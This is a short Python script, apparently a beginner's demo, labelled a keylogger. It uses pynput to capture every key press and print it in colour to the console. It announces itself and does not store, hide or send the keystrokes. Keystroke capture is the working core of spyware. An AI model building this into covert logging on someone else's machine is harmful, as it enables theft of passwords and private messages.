import pynput.keyboard
import colorama

colorama.init()
print("Keylogger is working")


def process_key_press(key):
    print(f"You are pressed button {colorama.Fore.RED}{key}{colorama.Fore.RESET}")


KeyboardListener = pynput.keyboard.Listener(on_press=process_key_press)

with KeyboardListener:
    KeyboardListener.join()
